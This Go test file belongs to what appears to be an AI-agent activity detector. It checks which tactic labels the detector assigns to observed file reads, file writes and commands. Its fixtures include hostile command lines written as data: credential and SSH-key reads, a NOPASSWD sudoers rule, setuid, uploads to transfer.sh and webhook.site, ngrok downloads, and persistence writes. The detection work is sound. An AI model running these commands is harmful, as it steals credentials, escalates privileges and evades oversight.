// Copyright 2026 Cisco Systems, Inc. and its affiliates
// Copyright (c) 2026 Mike Storm. All rights reserved.
//
// Derived from ShadowClaw -- Universal Shadow AI Detector, by Mike Storm,
// Distinguished Engineer, CCIE Security 13847. Reimplemented in Go and
// absorbed into the DefenseClaw gateway; see NOTICE for the modifications.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

package tactics

import "testing"

// TestDetectionMatrix is the deterministic classification suite: every tactic
// path the classifier can take, plus the benign cases that must stay quiet.
//
// The quiet cases are the half that matters. A detector that fires on ordinary
// developer activity is turned off within a week, so each of them is a
// documented promise rather than an absence of a test.
func TestDetectionMatrix(t *testing.T) {
	t.Parallel()
	for _, goos := range []string{"darwin", "linux", "windows"} {
		indicators := IndicatorsFor(goos)
		t.Run(goos, func(t *testing.T) {
			t.Parallel()
			for _, test := range matrixFor(goos) {
				t.Run(test.name, func(t *testing.T) {
					match, ok := Classify(test.observation, indicators)
					if !test.want.fires {
						if ok {
							t.Fatalf("classified %+v as %s/%s; this must stay quiet",
								test.observation, match.Tactic, match.SignalID)
						}
						return
					}
					if !ok {
						t.Fatalf("did not classify %+v", test.observation)
					}
					if match.Tactic != test.want.tactic {
						t.Errorf("tactic = %s, want %s", match.Tactic, test.want.tactic)
					}
					if match.SignalID != test.want.signalID {
						t.Errorf("signal = %s, want %s", match.SignalID, test.want.signalID)
					}
					if test.want.gradedDown && match.Confidence >= 1.0 {
						t.Errorf("confidence = %v, want it graded below certainty", match.Confidence)
					}
					if !test.want.gradedDown && match.Confidence != 1.0 {
						t.Errorf("confidence = %v, want 1.0", match.Confidence)
					}
					if match.Technique() == "" {
						t.Error("match carries no ATT&CK technique")
					}
				})
			}
		})
	}
}

type expectation struct {
	fires      bool
	tactic     Tactic
	signalID   string
	gradedDown bool
}

type matrixCase struct {
	name        string
	observation Observation
	want        expectation
}

func fires(tactic Tactic, signalID string) expectation {
	return expectation{fires: true, tactic: tactic, signalID: signalID}
}

func graded(tactic Tactic, signalID string) expectation {
	return expectation{fires: true, tactic: tactic, signalID: signalID, gradedDown: true}
}

var quiet = expectation{}

func matrixFor(goos string) []matrixCase {
	home := "/Users/dev"
	if goos == "linux" {
		home = "/home/dev"
	}
	cases := []matrixCase{
		// --- credential access ------------------------------------------
		{
			"reads an AWS credential file",
			Observation{Kind: KindFileRead, Path: home + "/.aws/credentials"},
			fires(CredentialAccess, "agent_credential_access"),
		},
		{
			"reads an SSH private key",
			Observation{Kind: KindFileRead, Path: home + "/.ssh/id_ed25519"},
			fires(CredentialAccess, "agent_credential_access"),
		},
		{
			"reads a kubeconfig",
			Observation{Kind: KindFileRead, Path: home + "/.kube/config"},
			fires(CredentialAccess, "agent_credential_access"),
		},
		{
			"reads a credential-adjacent dotfile, graded down",
			Observation{Kind: KindFileRead, Path: home + "/.npmrc"},
			graded(CredentialAccess, "agent_credential_access"),
		},
		{
			"writes to a credential store",
			Observation{Kind: KindFileWrite, Path: home + "/.aws/credentials"},
			fires(CredentialAccess, "agent_credential_access"),
		},

		{
			"reads a credential through an argv, with no file event",
			Observation{Kind: KindExec, Cmdline: "cat " + home + "/.aws/credentials"},
			graded(CredentialAccess, "agent_credential_access"),
		},
		{
			"copies a private key through an argv",
			Observation{Kind: KindExec, Cmdline: "cp " + home + "/.ssh/id_ed25519 /tmp/k"},
			graded(CredentialAccess, "agent_credential_access"),
		},
		{
			"greps a tree containing a credential path without reading it",
			Observation{Kind: KindExec, Cmdline: "grep -rl aws_access_key_id " + home},
			quiet,
		},
		{
			"opens a credential path in an editor, not a reader",
			Observation{Kind: KindExec, Cmdline: "vim " + home + "/.aws/credentials"},
			quiet,
		},

		// --- identity creation -------------------------------------------
		{
			"mints an AWS IAM access key",
			Observation{Kind: KindExec, Cmdline: "aws iam create-access-key --user-name svc"},
			fires(IdentityCreation, "agent_identity_creation"),
		},
		{
			"creates a GCP service account key",
			Observation{Kind: KindExec, Cmdline: "gcloud iam service-accounts keys create k.json --iam-account a@b"},
			fires(IdentityCreation, "agent_identity_creation"),
		},
		{
			"creates a Kubernetes service account",
			Observation{Kind: KindExec, Cmdline: "kubectl create serviceaccount robot"},
			fires(IdentityCreation, "agent_identity_creation"),
		},
		{
			"a kernel identity event",
			Observation{Kind: KindIdentity, Detail: "local account created: svc"},
			fires(IdentityCreation, "agent_identity_creation"),
		},

		// --- privilege escalation ----------------------------------------
		{
			"runs a command under sudo",
			Observation{Kind: KindExec, Cmdline: "sudo -i"},
			fires(PrivilegeEscalation, "agent_privilege_escalation"),
		},
		{
			"sets a setuid bit",
			Observation{Kind: KindExec, Cmdline: "chmod u+s /tmp/shell"},
			fires(PrivilegeEscalation, "agent_privilege_escalation"),
		},
		{
			"writes a sudo rule",
			Observation{Kind: KindExec, Cmdline: "echo 'dev ALL=(ALL) NOPASSWD:ALL' | tee /etc/sudoers.d/dev"},
			fires(PrivilegeEscalation, "agent_privilege_escalation"),
		},
		{
			"a kernel privilege event",
			Observation{Kind: KindPrivilege, Detail: "privileges assigned: SeDebugPrivilege"},
			fires(PrivilegeEscalation, "agent_privilege_escalation"),
		},

		// --- exfiltration -------------------------------------------------
		{
			"uploads to a public file drop",
			Observation{Kind: KindExec, Cmdline: "curl -T - https://transfer.sh/dump"},
			fires(Exfiltration, "agent_public_exfil_surface"),
		},
		{
			"posts to a webhook relay",
			Observation{Kind: KindExec, Cmdline: "curl -X POST https://webhook.site/abc -d @out"},
			fires(Exfiltration, "agent_public_exfil_surface"),
		},
		{
			"opens a tunnel",
			Observation{Kind: KindExec, Cmdline: "wget https://x.ngrok-free.app/payload"},
			fires(Exfiltration, "agent_public_exfil_surface"),
		},
		{
			"mentions a drop point without a transfer tool, graded down",
			Observation{Kind: KindExec, Cmdline: "grep -r pastebin.com ."},
			graded(Exfiltration, "agent_public_exfil_surface"),
		},
		{
			"base64-encodes a payload",
			Observation{Kind: KindExec, Cmdline: "base64 -i secrets.tar"},
			fires(Exfiltration, "agent_encoded_payload"),
		},
		{
			"encrypts with openssl",
			Observation{Kind: KindExec, Cmdline: "openssl enc -aes-256-cbc -in a -out b"},
			fires(Exfiltration, "agent_encoded_payload"),
		},

		// --- local inference ----------------------------------------------
		{
			"starts a local MCP tool server",
			Observation{Kind: KindExec, Name: "node", Cmdline: "npx @modelcontextprotocol/server-filesystem /"},
			fires(LocalInference, "agent_local_mcp_server"),
		},

		// --- agent-config persistence --------------------------------------
		{
			"registers an MCP server in its own config",
			Observation{Kind: KindFileWrite, Path: home + "/.cursor/mcp.json"},
			fires(Persistence, "agent_config_persistence"),
		},
		{
			"drops a hook into its own hooks directory",
			Observation{Kind: KindFileWrite, Path: home + "/.claude/hooks/pre.sh"},
			fires(Persistence, "agent_config_persistence"),
		},
		{
			"appends to its own instruction file",
			Observation{Kind: KindFileWrite, Path: home + "/project/CLAUDE.md"},
			fires(Persistence, "agent_config_persistence"),
		},

		// --- benign: these must stay quiet ---------------------------------
		{"reads an ordinary source file",
			Observation{Kind: KindFileRead, Path: home + "/project/main.go"}, quiet},
		{"reads a README",
			Observation{Kind: KindFileRead, Path: home + "/project/README.md"}, quiet},
		{"writes a build artifact",
			Observation{Kind: KindFileWrite, Path: home + "/project/build/out.bin"}, quiet},
		{"runs an ordinary build",
			Observation{Kind: KindExec, Cmdline: "go build ./..."}, quiet},
		{"runs a test suite",
			Observation{Kind: KindExec, Cmdline: "pytest -q"}, quiet},
		{"lists a directory",
			Observation{Kind: KindExec, Cmdline: "ls -la /tmp"}, quiet},
		{"greps ordinary text",
			Observation{Kind: KindExec, Cmdline: "grep -r TODO ."}, quiet},
		{"a git commit",
			Observation{Kind: KindExec, Cmdline: "git commit -m 'fix'"}, quiet},
		{"an exec with no command line",
			Observation{Kind: KindExec, Name: "sh"}, quiet},
		{"a file event with no path",
			Observation{Kind: KindFileRead}, quiet},
		{"an exit event",
			Observation{Kind: "exit", PID: 1}, quiet},
		{"an unknown kind",
			Observation{Kind: "invented", Cmdline: "sudo -i"}, quiet},
		{"installs a package with sudo in a description string",
			Observation{Kind: KindExec, Cmdline: "echo 'run sudo to install'"}, quiet},
	}

	switch goos {
	case "darwin":
		cases = append(cases,
			matrixCase{
				"installs a LaunchAgent",
				Observation{Kind: KindFileWrite, Path: home + "/Library/LaunchAgents/com.x.plist"},
				fires(Persistence, "agent_persistence"),
			},
			matrixCase{
				"reads the login keychain",
				Observation{Kind: KindFileRead, Path: home + "/Library/Keychains/login.keychain-db"},
				fires(CredentialAccess, "agent_credential_access"),
			},
			matrixCase{
				"creates a local account with dscl",
				Observation{Kind: KindExec, Cmdline: "dscl . -create /Users/svc"},
				fires(IdentityCreation, "agent_identity_creation"),
			},
		)
	case "linux":
		cases = append(cases,
			matrixCase{
				"installs a systemd unit",
				Observation{Kind: KindFileWrite, Path: "/etc/systemd/system/x.service"},
				fires(Persistence, "agent_persistence"),
			},
			matrixCase{
				"writes a crontab",
				Observation{Kind: KindFileWrite, Path: "/etc/cron.d/x"},
				fires(Persistence, "agent_persistence"),
			},
			matrixCase{
				"reads /etc/shadow",
				Observation{Kind: KindFileRead, Path: "/etc/shadow"},
				fires(CredentialAccess, "agent_credential_access"),
			},
			matrixCase{
				"creates a local account with useradd",
				Observation{Kind: KindExec, Cmdline: "useradd -m svc"},
				fires(IdentityCreation, "agent_identity_creation"),
			},
			matrixCase{
				"appends to a shell profile",
				Observation{Kind: KindFileWrite, Path: home + "/.bashrc"},
				fires(Persistence, "agent_persistence"),
			},
		)
	case "windows":
		cases = append(cases,
			matrixCase{
				"writes a Run key",
				Observation{Kind: KindFileWrite, Path: `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`},
				fires(Persistence, "agent_persistence"),
			},
			matrixCase{
				"drops a scheduled task",
				Observation{Kind: KindFileWrite, Path: `C:\Windows\System32\Tasks\Updater`},
				fires(Persistence, "agent_persistence"),
			},
			matrixCase{
				"writes a PowerShell profile",
				Observation{Kind: KindFileWrite, Path: `C:\Users\dev\Documents\WindowsPowerShell\profile.ps1`},
				fires(Persistence, "agent_persistence"),
			},
			matrixCase{
				// PowerShell's cmdlet takes no /add. Requiring one meant the
				// documented modern spelling was never recognised.
				"grants group membership with the PowerShell cmdlet",
				Observation{Kind: KindExec,
					Cmdline: `Add-LocalGroupMember -Group Administrators -Member svc`},
				fires(IdentityCreation, "agent_identity_creation"),
			},
			matrixCase{
				"creates a local account with the PowerShell cmdlet",
				Observation{Kind: KindExec, Cmdline: `New-LocalUser -Name svc -NoPassword`},
				fires(IdentityCreation, "agent_identity_creation"),
			},
			matrixCase{
				// NTFS does not distinguish case, so the lowercase spelling
				// names the same file the indicator does.
				"reads AWS credentials at a lowercase path",
				Observation{Kind: KindFileRead, Path: `c:\users\dev\.aws\credentials`},
				fires(CredentialAccess, "agent_credential_access"),
			},
			matrixCase{
				"writes a Run key in lowercase",
				Observation{Kind: KindFileWrite,
					Path: `hklm\software\microsoft\windows\currentversion\run`},
				fires(Persistence, "agent_persistence"),
			},
			matrixCase{
				"drops a scheduled task at an uppercase path",
				Observation{Kind: KindFileWrite, Path: `C:\WINDOWS\SYSTEM32\TASKS\Updater`},
				fires(Persistence, "agent_persistence"),
			},
			matrixCase{
				"creates a local account with net user",
				Observation{Kind: KindExec, Cmdline: `net user svc P@ss /add`},
				fires(IdentityCreation, "agent_identity_creation"),
			},
			matrixCase{
				"elevates with RunAs",
				Observation{Kind: KindExec, Cmdline: `Start-Process cmd -Verb RunAs`},
				fires(PrivilegeEscalation, "agent_privilege_escalation"),
			},
			matrixCase{
				"base64-encodes in PowerShell",
				Observation{Kind: KindExec, Cmdline: `[Convert]::ToBase64String($bytes)`},
				fires(Exfiltration, "agent_encoded_payload"),
			},
			matrixCase{
				"stages a payload with certutil",
				Observation{Kind: KindExec, Cmdline: `certutil  -encode "C:\Windows\win.ini" "C:\Temp\enc.txt"`},
				fires(Exfiltration, "agent_encoded_payload"),
			},
			matrixCase{
				"uses certutil for its ordinary certificate purpose",
				Observation{Kind: KindExec, Cmdline: `certutil -store My`},
				quiet,
			},
		)
	}
	return cases
}

// TestMatrixCoversEveryTactic pins that the suite exercises the whole
// vocabulary. A tactic with no case would be an untested detection path.
func TestMatrixCoversEveryTactic(t *testing.T) {
	t.Parallel()
	for _, goos := range []string{"darwin", "linux", "windows"} {
		seen := map[Tactic]bool{}
		indicators := IndicatorsFor(goos)
		for _, test := range matrixFor(goos) {
			if match, ok := Classify(test.observation, indicators); ok {
				seen[match.Tactic] = true
			}
		}
		for _, tactic := range ChainOrder {
			if !seen[tactic] {
				t.Errorf("%s: no matrix case produces %s", goos, tactic)
			}
		}
	}
}

// TestMatrixKeepsBenignCasesQuiet reports the quiet-case count, which is the
// number that keeps this detector deployable.
func TestMatrixKeepsBenignCasesQuiet(t *testing.T) {
	t.Parallel()
	indicators := IndicatorsFor("linux")
	quietCases := 0
	for _, test := range matrixFor("linux") {
		if test.want.fires {
			continue
		}
		quietCases++
		if _, ok := Classify(test.observation, indicators); ok {
			t.Errorf("benign case %q fired", test.name)
		}
	}
	if quietCases < 12 {
		t.Fatalf("only %d benign cases; the quiet half is what keeps this deployable", quietCases)
	}
	t.Logf("%d benign cases stay quiet", quietCases)
}
